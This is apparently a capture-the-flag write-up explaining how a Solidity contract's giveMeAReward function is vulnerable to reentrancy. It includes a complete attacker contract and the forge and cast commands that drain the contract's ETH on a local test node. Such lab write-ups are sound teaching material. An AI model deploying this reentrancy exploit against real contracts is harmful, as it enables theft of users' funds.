# Blockchain (by @g4B and @mc_giangi)

## 1. Challenge Description

The challenge provides two instances. A RPC endpoint to a local geth node with the `Setup` and `Target` contracts deployed, and a netcat connection to interact with the challenge script.
The goal is to drain the `Target` contract. Success is measured by the `Setup` contract's `isSolved()` function, which will return `true` once the `Target`'s balance is zero.

## 2. Vulnerability Analysis

Let's examine the `Target.sol` contract.

At first glance, we see the developer is aware of reentrancy attacks. The withdraw function is correctly secured with a `noReentrant` modifier, which follows the `Checks-Effects-Interactions` pattern (by using a mutex).
However, the giveMeAReward function, which also transfers Ether, does not use this modifier.
More importantly, it violates the Checks-Effects-Interactions pattern:

- Check: It calls `notSoFast()`, which checks the lastAction timestamp.
- Interaction: It performs the external call: `user.call{value: reward}("")`.
- Effect: Only after the external call, it updates the state: `lastAction[msg.sender] = block.timestamp;`.

Because the state update happens after the interaction, we can re-enter the contract. An attacker contract's `receive()` function can be triggered by the `.call()` and immediately call `giveMeAReward` again. Since `lastAction` has not been updated, the `notSoFast()` check will pass every single time, allowing for a recursive loop that drains the contract 1 ETH at a time.

## 3. Exploitation Strategy

Our attack plan is as follows:

1. Create an Exploit contract that will recursively call `giveMeAReward`.
2. The Exploit contract's `receive()` function will be the attack vector.
3. The loop will be:
    - Exploit calls `attack()`.
    - `attack()` calls `Target.giveMeAReward()`.
    - Target sends 1 ETH to Exploit, triggering `Exploit.receive()`.
    - `Exploit.receive()` calls `Target.giveMeAReward()` again.
    - This loop repeats until the Target's balance is less than 1 ETH.
4. The Target starts with 100 ETH, so this loop will run 100 times.

Here is the complete code for the attacker contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface TargetVault {
    function giveMeAReward(address users) external;
}

contract Exploit {
    TargetVault public target;
    address public justmyself;

    constructor(address _vault) payable {
        target = TargetVault(_vault);
        justmyself = payable(address(this));
    }

    function attack() public payable {
        target.giveMeAReward(justmyself);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.giveMeAReward(justmyself);
        }
    }
}
```

## 4. Execution

First, we deploy the Exploit contract, passing the Target's address to its constructor.

```bash
forge create Attacker.sol:Exploit \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $TARGET
```

This will give us the deployed address, which we'll call `$ATTACKER_CONTRACT`.
Next, we launch the attack. A simple cast send will fail due to gas estimation errors or client-side fee caps. The 100-deep recursive call is too complex to estimate, and the potential fee (`Gas Limit` \* `Gas Price`) will exceed cast's default safety cap.
To succeed, we must manually override the gas limit parameter:

- --gas-limit 700000000: A high gas limit to accommodate the deep recursion. It is important to not set this too high to avoid potential gas fee higher than the limit.

Final Exploit Command

```bash
cast send $ATTACKER_CONTRACT "attack()" \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    --gas-limit 700000000
```

## 5. Get the Flag

After the transaction succeeds, the `Target` contract is empty. We can now interact with the challenge script to get the flag.
